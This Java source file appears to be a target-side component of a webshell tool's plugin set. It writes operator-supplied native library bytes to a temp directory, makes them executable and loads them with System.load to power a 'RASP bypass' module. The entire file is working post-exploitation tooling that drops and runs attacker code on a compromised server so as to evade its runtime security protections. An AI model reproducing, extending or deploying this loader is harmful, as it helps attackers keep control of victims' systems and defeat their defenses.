package shells.plugins.java.assets;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.file.Files;
import java.util.Locale;

/**
 * Target-side native library helper (no JNI methods here).
 * Write bytes / path then {@link System#load(String)} for RaspBypassModule natives.
 *
 * Compile: javac -source 1.8 -target 1.8 RaspNativeLoader.java
 * Package as assets/RaspNativeLoader.classs and include before RaspBypassModule.
 */
public final class RaspNativeLoader {

    private RaspNativeLoader() {
    }

    public static String defaultLibFileName() {
        String os = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
        String arch = System.getProperty("os.arch", "").toLowerCase(Locale.ROOT);
        boolean x64 = arch.contains("64") || arch.contains("amd64") || arch.contains("x86_64");
        if (os.contains("win")) {
            return x64 ? "rasp_bypass_win_x64.dll" : "rasp_bypass_win_x86.dll";
        }
        if (os.contains("mac") || os.contains("darwin")) {
            return "rasp_bypass_mac.so";
        }
        return x64 ? "rasp_bypass_linux_x64.so" : "rasp_bypass_linux_x86.so";
    }

    public static File resolveLoadFile(String soPath, byte[] libBytes, String preferredName) throws Exception {
        if (soPath != null && soPath.trim().length() > 0) {
            File f = new File(soPath.trim());
            if (f.isFile()) {
                return f.getAbsoluteFile();
            }
            // path given but missing — if we have bytes, write there
            if (libBytes != null && libBytes.length > 0) {
                File parent = f.getParentFile();
                if (parent != null) {
                    parent.mkdirs();
                }
                writeBytes(f, libBytes);
                return f.getAbsoluteFile();
            }
            throw new IllegalArgumentException("soPath not found and no libBytes: " + soPath);
        }
        if (libBytes == null || libBytes.length == 0) {
            throw new IllegalArgumentException("empty soPath and empty libBytes");
        }
        String name = (preferredName != null && preferredName.trim().length() > 0)
                ? preferredName.trim()
                : defaultLibFileName();
        // avoid path traversal
        name = new File(name).getName();
        File dir = new File(System.getProperty("java.io.tmpdir", "."), "gsl_rasp_jni");
        dir.mkdirs();
        File out = new File(dir, name);
        // Reuse existing file if same size (Windows locks DLL after System.load)
        if (out.isFile() && out.length() == libBytes.length) {
            return out.getAbsoluteFile();
        }
        if (out.isFile()) {
            // locked or different content — unique name
            String base = name;
            int dot = name.lastIndexOf('.');
            String stem = dot > 0 ? name.substring(0, dot) : name;
            String ext = dot > 0 ? name.substring(dot) : "";
            out = new File(dir, stem + "_" + System.currentTimeMillis() + ext);
        }
        writeBytes(out, libBytes);
        try {
            out.setExecutable(true);
        } catch (Exception ignored) {
        }
        return out.getAbsoluteFile();
    }

    private static void writeBytes(File f, byte[] data) throws Exception {
        FileOutputStream fos = null;
        try {
            fos = new FileOutputStream(f);
            fos.write(data);
            fos.flush();
        } finally {
            if (fos != null) {
                try {
                    fos.close();
                } catch (Exception ignored) {
                }
            }
        }
    }

    /**
     * @return multi-line log; sets loaded flag via result prefix {@code LOADED:}
     */
    public static String loadLibrary(String soPath, byte[] libBytes, String preferredName) {
        StringBuilder result = new StringBuilder();
        result.append("=== RaspNativeLoader ===\n");
        try {
            File lib = resolveLoadFile(soPath, libBytes, preferredName);
            result.append("file: ").append(lib.getAbsolutePath()).append("\n");
            result.append("size: ").append(lib.length()).append("\n");
            try {
                System.load(lib.getAbsolutePath());
                result.append("LOADED:").append(lib.getAbsolutePath()).append("\n");
                result.append("[+] System.load ok\n");
            } catch (UnsatisfiedLinkError e) {
                String m = e.getMessage() != null ? e.getMessage() : "";
                if (m.contains("already loaded")) {
                    if (m.contains("another classloader")) {
                        result.append("[-] already loaded in another ClassLoader — reconnect shell\n");
                        result.append(m).append("\n");
                    } else {
                        result.append("LOADED:").append(lib.getAbsolutePath()).append("\n");
                        result.append("[+] already loaded in this ClassLoader\n");
                    }
                } else {
                    result.append("[-] UnsatisfiedLinkError: ").append(m).append("\n");
                }
            }
        } catch (Exception e) {
            result.append("[-] Error: ").append(e.getMessage()).append("\n");
        }
        return result.toString();
    }

    public static void cleanupQuietly(File f) {
        if (f == null) {
            return;
        }
        try {
            Files.deleteIfExists(f.toPath());
        } catch (Exception ignored) {
        }
    }
}
